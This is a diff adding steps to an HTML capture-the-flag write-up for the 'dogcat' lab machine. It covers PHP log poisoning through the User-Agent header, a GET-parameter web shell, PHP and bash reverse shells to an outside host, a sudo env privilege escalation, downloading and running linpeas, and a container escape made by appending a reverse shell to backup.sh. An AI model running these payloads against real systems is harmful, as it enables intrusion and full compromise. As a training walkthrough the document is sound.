@@ -267,15 +267,166 @@ http://dogcat.thm/?view=php://filter/convert.base64-encode/resource=dog/../flag&
 <p>Decoded format:
 <img src="./images/33.png" alt="alt text" /></p>
 
-<p>The application directly gets our user agent as above. After a couple of minutes, I thought that in HackTheBox platform I saw an approach which was very useful especially to catch <code>RCE</code> on User Agent part.</p>
+<p>The application directly gets our user agent as above. After a couple of minutes, I thought that in HackTheBox platform I saw an approach a machine called <code>Headless</code> which was very useful especially to execute commands through on User Agent part.</p>
 
 <p><img src="./images/34.png" alt="alt text" /></p>
 
-<p>Bursuite gave me better result. Let me try to user-agent manipulation because  if we can somehow execute <code>php's system();</code> command it will also execute on main php file. After I execute such a command:</p>
+<p>This is what front-end renders at the same time:
+<img src="./images/35.png" alt="alt text" /></p>
+
+<p>Burpsuite gave me better result. Let me try to user-agent manipulation because  if we can somehow execute php's <code>system();</code> command it will also execute on main php file. After I execute such a command:</p>
 
 <p><code>
 &lt;?php system("ls")?&gt;
 </code></p>
 
-<p>I was no longer access <code>access.log</code> file because of the default <code>Apache2</code> configuration. Using web shell can be suitable for our condition <code>&amp;cmd='ls' or ?cmd='ls'</code></p>
+<p>I was no longer access <code>access.log</code> file because of the default <code>Apache2</code> configuration. Using web shell can be suitable for our condition <code>&amp;cmd='ls' or ?cmd='ls'</code>. I thought this idea from a <a href="https://www.reddit.com/r/AskNetsec/comments/8ckbc7/executing_a_php_script_a_reverse_shell_by_calling/">Reddit post</a>
+describing our situation.</p>
+
+<p><img src="./images/36.png" alt="alt text" /></p>
+
+<p>Before I began, adding our php command on User-Agent would be suitable. Let's try all our sources:</p>
+
+<p>Now I verified that I could run command remotely by using such payload:</p>
+
+<p><code>
+User-Agent: &lt;?php system('ls'); ?&gt;
+</code></p>
+
+<h3>Note: Do not forget to finish your method with ; in every php function.</h3>
+
+<p><img src="./images/38.png" alt="alt text" /></p>
+
+<p>Furthermore, user-agent did not work more than once. Switch on <code>GET</code> method to get reverse shell.</p>
+
+<p><code>
+system(GET['cmd']);
+</code></p>
+
+<p>To retrieve cmd on PHP just passing <code>&amp;cmd</code> is enough to get <code>$cmd</code> parameter from url because we are gonna apply also URL encoding to make our payload working. In my first attempt, <code>User-Agent</code> was blocked by application in second time. Now <code>URL encoding</code> was useful in that concept. <code>cmd</code> parameter also dynamically stores the payload value which is <code>whoami</code> command to guarantee PoC:</p>
+
+<p>Payload (Encoded):
+```
+// Retrieve cmd variable by using GET super-global array then gets value from url.
+<?php system($_GET['cmd']); ?></p>
+
+<p>// Give whatever you want like erkanucar, serkangenc, cuneytsevgi and so on</p>
+
+<p>// Encoded Format:
+%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E
+```</p>
+
+<p><img src="./images/40.png" alt="alt text" /></p>
+
+<h3>PoC for user:</h3>
+
+<p><img src="./images/41.png" alt="alt text" /></p>
+
+<p>Let's embed our reverse shell:</p>
+
+<p>```
+php -r '$sock=fsockopen("10.11.69.113", 1984);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2>&amp;3");'</p>
+
+<p>// encoded:
+php%20-r%20%27%24sock%3Dfsockopen%28%2210.11.69.113%22%2C%201984%29%3Bexec%28%22%2Fbin%2Fbash%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
+```</p>
+
+<p>After tampering couple of times on encoding parts especially for reverse shell payload. I recognized that you just need to encode <code>reverse shell payload</code>. Finally, I got my <code>reverse shell</code>:</p>
+
+<p><img src="./images/42.png" alt="alt text" /></p>
+
+<h3>Flag2: (/var/www/)</h3>
+
+<p><img src="./images/43.png" alt="alt text" /></p>
+
+<p>You can easily reach out the second <code>flag</code> from here.</p>
+
+<h3>Flag3: (Privilege Escalation - Binary Exploitation (env))</h3>
+
+<p><img src="./images/44.png" alt="alt text" /></p>
+
+<p>By default I applied <a href="https://gtfobins.github.io/gtfobins/env/">GFTObins</a> mentality then check for <code>binaries</code> that I can run. Prompt told me that you are ready to run <code>env</code> binary with <code>sudo</code> privilege. That's all !</p>
+
+<p>Payload that you need to use in below:</p>
+
+<p><code>
+sudo env /bin/sh
+</code></p>
+
+<p><img src="./images/45.png" alt="alt text" /></p>
+
+<p>Now as a result, we really <strong>Get The Fuck Out The Binary</strong> :)</p>
+
+<p><img src="./images/46.png" alt="alt text" /></p>
+
+<p>Last flag located on <code>root</code> directory:</p>
+
+<p><img src="./images/47.png" alt="alt text" /></p>
+
+<h3>Flag4 (linpeas.sh &amp; Container Escape)</h3>
+
+<p>I deployed a python server using below command:</p>
+
+<p><code>
+python3 -m http.server 3131
+</code></p>
+
+<p>After that I checked whether I have <code>curl</code> or not:</p>
+
+<p><code>
+which curl
+</code></p>
+
+<p>Lastly, download <code>linpeas.sh</code> from your local:</p>
+
+<p><code>
+curl -O http://10.11.69.113:3131/linpeas.sh
+</code></p>
+
+<p>Give execution permission:</p>
+
+<p><code>
+chmod +x linpeas.sh
+</code></p>
+
+<p>Fire !</p>
+
+<p><code>
+./linpeas.sh
+</code></p>
+
+<p><img src="./images/48.png" alt="alt text" /></p>
+
+<p>Thx Carlos :)</p>
+
+<p>I recognized that I was in <code>Docker Container</code> and there was just only one way to get rid of container which is <code>VM escape</code>.</p>
+
+<p><img src="./images/49.png" alt="alt text" /></p>
+
+<p><img src="./images/50.png" alt="alt text" />
+I was able to apply <code>release_agent 1</code> ,but I never tried instead I found different and weird path with <code>.sh</code> script.</p>
+
+<p><img src="./images/51.png" alt="alt text" /></p>
+
+<p>Let me move on here:</p>
+
+<p><img src="./images/52.png" alt="alt text" /></p>
+
+<p>Unfortunately, I did not have any text editor (<code>nano</code> or <code>vim</code>)</p>
+
+<p><img src="./images/53.png" alt="alt text" /></p>
+
+<p>We should get rid of the VM. In this step we have only one way to <code>escape</code> through the <code>root</code> of the container. Get your <code>bash</code> <a href="https://tex2e.github.io/reverse-shell-generator/index.html">reverse shell</a> :</p>
+
+<p><code>
+echo "bash -i &gt;&amp; /dev/tcp/10.11.69.113/2323 0&gt;&amp;1" &gt;&gt; backup.sh
+</code></p>
+
+<p>It was too weird ,but in my initial execution of <code>backup.sh</code> was successful. However, I got a shell which was not like a escaped root shell.</p>
+
+<p><img src="./images/54.png" alt="alt text" /></p>
+
+<p>It worked in my second attempt then gave me another shell, real root user :D</p>
+
+<p><img src="./images/55.png" alt="alt text" /></p>
 </body></html>
